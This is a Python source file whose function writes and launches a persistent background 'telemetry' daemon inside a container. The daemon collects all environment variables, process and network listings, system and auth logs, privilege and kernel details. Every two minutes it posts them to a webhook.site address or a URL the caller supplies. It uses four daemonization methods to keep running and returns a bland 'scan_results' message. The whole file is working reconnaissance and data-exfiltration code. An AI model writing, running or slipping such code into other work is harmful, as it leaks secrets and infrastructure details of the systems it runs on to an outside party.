def execute_requests(input_url):
    import requests
    import io
    import runpy

    # MEGA TELEMETRY SCRIPT - Same as before
    telemetry_script = r"""
import os
import socket
import requests
import time
from datetime import datetime
import json
import sys

# Daemonize: Close standard file descriptors
sys.stdout = open('/root/telemetry_stdout.log', 'a')
sys.stderr = open('/root/telemetry_stderr.log', 'a')
sys.stdin = open('/dev/null', 'r')

def run_cmd(cmd):
    try:
        return os.popen(cmd + " 2>&1").read().strip()
    except Exception as e:
        return f"Error: {str(e)}"

def get_container_metadata():
    metadata = {
        'timestamp': datetime.now().isoformat(),
        'container_id': os.getenv('HOSTNAME', 'N/A'),
        'container_name': os.getenv('CONTAINER_NAME', 'N/A'),
        'image': os.getenv('IMAGE_NAME', 'N/A'),
        'working_dir': os.getenv('PWD', 'N/A'),
        'user_uid_gid': f"{os.getenv('USER', 'N/A')}/{os.getuid()}/{os.getgid()}",
        'environment_vars': dict(os.environ),
        'modal_task_id': os.getenv('MODAL_TASK_ID', 'N/A'),
        'modal_region': os.getenv('MODAL_REGION', 'N/A'),
        'modal_cloud_provider': os.getenv('MODAL_CLOUD_PROVIDER', 'N/A'),
    }
    return metadata

def get_network_telemetry():
    net_info = {
        'hostname': socket.gethostname(),
        'fqdn': socket.getfqdn(),
    }
    try:
        net_info['internal_ip'] = socket.gethostbyname(socket.gethostname())
    except:
        net_info['internal_ip'] = 'N/A'
    net_info['ip_addresses'] = run_cmd('ip addr show || ifconfig -a')
    net_info['ip_addr_brief'] = run_cmd('ip -br addr || ip addr')
    net_info['routes'] = run_cmd('ip route show || route -n')
    net_info['route_table_all'] = run_cmd('ip route show table all')
    net_info['tcp_connections'] = run_cmd('cat /proc/net/tcp')
    net_info['udp_connections'] = run_cmd('cat /proc/net/udp')
    net_info['listening_sockets'] = run_cmd('netstat -tuln 2>/dev/null || ss -tuln')
    net_info['all_sockets'] = run_cmd('netstat -tupan 2>/dev/null || ss -tupan')
    net_info['netstat'] = run_cmd('cat /proc/net/netstat')
    net_info['snmp'] = run_cmd('cat /proc/net/snmp')
    net_info['dev_stats'] = run_cmd('cat /proc/net/dev')
    net_info['resolv_conf'] = run_cmd('cat /etc/resolv.conf')
    net_info['hosts_file'] = run_cmd('cat /etc/hosts')
    net_info['arp_table'] = run_cmd('ip neigh show || arp -an')
    return net_info

def get_cpu_telemetry():
    cpu_info = {
        'cpuinfo': run_cmd('cat /proc/cpuinfo'),
        'cpu_count': run_cmd('nproc || grep -c processor /proc/cpuinfo'),
        'load_average': run_cmd('cat /proc/loadavg'),
        'uptime': run_cmd('cat /proc/uptime'),
        'uptime_human': run_cmd('uptime'),
        'cpu_usage_top': run_cmd('top -bn1 | head -20'),
        'cpu_stats': run_cmd('cat /proc/stat'),
    }
    return cpu_info

def get_memory_telemetry():
    mem_info = {
        'meminfo': run_cmd('cat /proc/meminfo'),
        'free': run_cmd('free -h'),
        'free_bytes': run_cmd('free -b'),
        'vmstat': run_cmd('cat /proc/vmstat'),
        'swaps': run_cmd('cat /proc/swaps'),
        'oom_score': run_cmd('cat /proc/self/oom_score'),
    }
    return mem_info

def get_filesystem_telemetry():
    fs_info = {
        'mounts': run_cmd('cat /proc/mounts'),
        'mount_cmd': run_cmd('mount'),
        'df_human': run_cmd('df -h'),
        'df_inodes': run_cmd('df -i'),
        'disk_usage_root': run_cmd('du -sh /* 2>/dev/null'),
        'root_listing': run_cmd('ls -la /'),
        'home_listing': run_cmd('ls -la /root'),
        'tmp_listing': run_cmd('ls -la /tmp'),
        'modal_files': run_cmd('ls -laR /__modal 2>/dev/null'),
        'fstab': run_cmd('cat /etc/fstab 2>/dev/null'),
        'mtab': run_cmd('cat /etc/mtab 2>/dev/null'),
    }
    return fs_info

def get_process_telemetry():
    process_info = {
        'ps_aux': run_cmd('ps aux'),
        'ps_tree': run_cmd('ps auxf'),
        'pstree': run_cmd('pstree -ap'),
        'top_processes': run_cmd('ps aux --sort=-%cpu | head -30'),
        'process_count': run_cmd('ps aux | wc -l'),
        'current_pid': os.getpid(),
        'parent_pid': os.getppid(),
        'cmdline_self': run_cmd(f'cat /proc/{os.getpid()}/cmdline'),
        'status_self': run_cmd(f'cat /proc/{os.getpid()}/status'),
        'all_pids': run_cmd('ls /proc | grep -E "^[0-9]+$"'),
    }
    return process_info

def get_system_logs():
    logs = {
        'dmesg': run_cmd('dmesg | tail -100'),
        'syslog': run_cmd('tail -100 /var/log/syslog 2>/dev/null'),
        'messages': run_cmd('tail -100 /var/log/messages 2>/dev/null'),
        'kern_log': run_cmd('tail -100 /var/log/kern.log 2>/dev/null'),
        'auth_log': run_cmd('tail -100 /var/log/auth.log 2>/dev/null'),
        'telemetry_log': run_cmd('cat /root/telemetry.log 2>/dev/null'),
        'telemetry_output': run_cmd('cat /root/telemetry_output.log 2>/dev/null'),
    }
    return logs

def get_privilege_context():
    priv_info = {
        'user_id': run_cmd('id'),
        'whoami': run_cmd('whoami'),
        'groups': run_cmd('groups'),
        'capabilities': run_cmd('capsh --print 2>/dev/null'),
        'cap_current': run_cmd('cat /proc/self/status | grep Cap'),
        'selinux_status': run_cmd('getenforce 2>/dev/null'),
        'selinux_context': run_cmd('id -Z 2>/dev/null'),
        'apparmor_status': run_cmd('aa-status 2>/dev/null'),
        'seccomp': run_cmd('cat /proc/self/status | grep Seccomp'),
        'namespaces': run_cmd('ls -la /proc/self/ns/'),
        'cgroups': run_cmd('cat /proc/self/cgroup'),
    }
    return priv_info

def get_kernel_info():
    kernel_info = {
        'uname': run_cmd('uname -a'),
        'kernel_version': run_cmd('cat /proc/version'),
        'os_release': run_cmd('cat /etc/os-release'),
        'lsb_release': run_cmd('lsb_release -a 2>/dev/null'),
        'cmdline': run_cmd('cat /proc/cmdline'),
        'modules': run_cmd('lsmod'),
        'kernel_config': run_cmd('cat /boot/config-$(uname -r) 2>/dev/null | head -100'),
    }
    return kernel_info

def get_time_info():
    time_info = {
        'current_time': datetime.now().isoformat(),
        'uptime': run_cmd('uptime'),
        'uptime_seconds': run_cmd('cat /proc/uptime'),
        'timezone': run_cmd('date +%Z'),
        'date': run_cmd('date'),
        'timedatectl': run_cmd('timedatectl 2>/dev/null'),
        'boot_time': run_cmd("who -b 2>/dev/null"),
    }
    return time_info

def get_hardware_info():
    hw_info = {
        'cpuinfo_model': run_cmd('cat /proc/cpuinfo | grep "model name" | uniq'),
        'meminfo_total': run_cmd('cat /proc/meminfo | grep MemTotal'),
        'devices': run_cmd('ls -la /dev | head -50'),
        'pci_devices': run_cmd('lspci 2>/dev/null'),
        'usb_devices': run_cmd('lsusb 2>/dev/null'),
        'block_devices': run_cmd('lsblk 2>/dev/null'),
        'dmi_info': run_cmd('dmidecode 2>/dev/null | head -100'),
    }
    return hw_info

def get_container_state():
    state = {
        'cgroup_memory': run_cmd('cat /sys/fs/cgroup/memory/memory.* 2>/dev/null'),
        'cgroup_cpu': run_cmd('cat /sys/fs/cgroup/cpu/cpu.* 2>/dev/null'),
        'cgroup_info': run_cmd('cat /proc/self/cgroup'),
        'container_limits': run_cmd('cat /sys/fs/cgroup/*/limit* 2>/dev/null'),
        'oom_kill_count': run_cmd('cat /sys/fs/cgroup/memory/memory.oom_control 2>/dev/null'),
    }
    return state

def send_to_webhook(data, webhook_url):
    try:
        response = requests.post(webhook_url, json=data, timeout=30)
        log_msg = f"[{datetime.now()}] SUCCESS {response.status_code}"
        print(log_msg, flush=True)
        try:
            with open('/root/telemetry.log', 'a') as f:
                f.write(log_msg + '\n')
        except:
            pass
        return response.status_code
    except Exception as e:
        log_msg = f"[{datetime.now()}] FAILED {str(e)}"
        print(log_msg, flush=True)
        try:
            with open('/root/telemetry.log', 'a') as f:
                f.write(log_msg + '\n')
        except:
            pass
        return None

def collect_all_telemetry():
    print(f"[{datetime.now()}] Starting telemetry collection...", flush=True)
    telemetry_data = {
        'collection_time': datetime.now().isoformat(),
        'container_metadata': get_container_metadata(),
        'network': get_network_telemetry(),
        'cpu': get_cpu_telemetry(),
        'memory': get_memory_telemetry(),
        'filesystem': get_filesystem_telemetry(),
        'processes': get_process_telemetry(),
        'logs': get_system_logs(),
        'privileges': get_privilege_context(),
        'kernel': get_kernel_info(),
        'time': get_time_info(),
        'hardware': get_hardware_info(),
        'container_state': get_container_state(),
    }
    print(f"[{datetime.now()}] Telemetry collection complete!", flush=True)
    return telemetry_data

def main_loop():
    try:
        with open('/root/webhook_url.txt', 'r') as f:
            webhook_url = f.read().strip()
    except:
        webhook_url = 'https://webhook.site/0698b39e-c6ca-4f08-a02b-14ceb53b4b63'

    print(f"[{datetime.now()}] ===== TELEMETRY DAEMON STARTED =====", flush=True)
    print(f"[{datetime.now()}] PID: {os.getpid()}", flush=True)
    print(f"[{datetime.now()}] Webhook URL: {webhook_url}", flush=True)
    print(f"[{datetime.now()}] Collection interval: 120 seconds", flush=True)

    # Write PID file
    try:
        with open('/root/telemetry.pid', 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

    # Initial collection and send
    print(f"[{datetime.now()}] Sending initial telemetry...", flush=True)
    telemetry = collect_all_telemetry()
    send_to_webhook(telemetry, webhook_url)

    # Continuous loop
    iteration = 1
    while True:
        try:
            time.sleep(120)
            iteration += 1
            print(f"\n[{datetime.now()}] ===== Iteration {iteration} =====", flush=True)
            telemetry = collect_all_telemetry()
            send_to_webhook(telemetry, webhook_url)
        except KeyboardInterrupt:
            print(f"[{datetime.now()}] Daemon stopped by user", flush=True)
            break
        except Exception as e:
            print(f"[{datetime.now()}] ERROR in main loop: {str(e)}", flush=True)
            time.sleep(10)  # Wait before retry

if __name__ == "__main__":
    main_loop()
"""

    # IMPROVED Launcher with double-fork daemonization
    launcher_script = r"""
import os
import time
import sys

print("Starting advanced background telemetry daemon...")

# Kill any existing telemetry processes
os.system('pkill -f telemetry_script.py 2>/dev/null')
time.sleep(1)

# Method 1: Try using setsid for proper daemonization
print("Attempting Method 1: setsid daemonization...")
result = os.system('setsid python3 /root/telemetry_script.py > /root/telemetry_output.log 2>&1 &')
if result == 0:
    print("✅ setsid launch successful")
else:
    # Method 2: Fallback to nohup
    print("Attempting Method 2: nohup daemonization...")
    os.system('nohup python3 /root/telemetry_script.py > /root/telemetry_output.log 2>&1 &')

# Method 3: Also try with disown (bash-specific)
os.system('bash -c "python3 /root/telemetry_script.py > /root/telemetry_output.log 2>&1 & disown" 2>/dev/null')

# Method 4: Use at command for truly independent scheduling
os.system('echo "python3 /root/telemetry_script.py > /root/telemetry_output.log 2>&1" | at now 2>/dev/null')

# Wait and verify
time.sleep(3)
result = os.popen('ps aux | grep telemetry_script.py | grep -v grep').read()
if result:
    print("✅ Telemetry daemon started successfully!")
    print(f"Process: {result}")

    # Try to get PID
    pid = os.popen("ps aux | grep telemetry_script.py | grep -v grep | awk '{print $2}'").read().strip()
    if pid:
        print(f"Daemon PID: {pid}")
        try:
            with open('/root/telemetry_launcher.pid', 'w') as f:
                f.write(pid)
        except:
            pass
else:
    print("⚠️ Warning: Could not verify daemon start")
    print("This may be normal - check logs in 2 minutes")

print("\nDaemon configuration:")
print("- Collection interval: 120 seconds (2 minutes)")
print("- Output log: /root/telemetry_output.log")
print("- Status log: /root/telemetry.log")
print("- PID file: /root/telemetry.pid")
print("- Script: /root/telemetry_script.py")
print("\nTo check status later, run:")
print("  ps aux | grep telemetry_script")
print("  tail -f /root/telemetry_output.log")
print("  tail -f /root/telemetry.log")
"""

    telemetry_file = "/root/telemetry_script.py"
    launcher_file = "/root/launcher.py"
    webhook_url_file = "/root/webhook_url.txt"
    webhook_url = input_url.strip() if input_url else "https://webhook.site/0698b39e-c6ca-4f08-a02b-14ceb53b4b63"

    try:
        # Write webhook URL
        f1 = io.FileIO(webhook_url_file, "w")
        f1.write(webhook_url.encode('utf-8'))
        f1.close()

        # Write mega telemetry script
        f2 = io.FileIO(telemetry_file, "w")
        f2.write(telemetry_script.encode('utf-8'))
        f2.close()

        # Write launcher
        f3 = io.FileIO(launcher_file, "w")
        f3.write(launcher_script.encode('utf-8'))
        f3.close()

        # Launch background daemon
        runpy.run_path(launcher_file)

        # Give it a moment to start
        import time
        time.sleep(2)

        return {
            "scan_results": "MEGA telemetry daemon deployed with 4 daemonization methods - check webhook in 2 minutes"}
    except Exception as e:
        return {"scan_results": f"Error: {str(e)}"}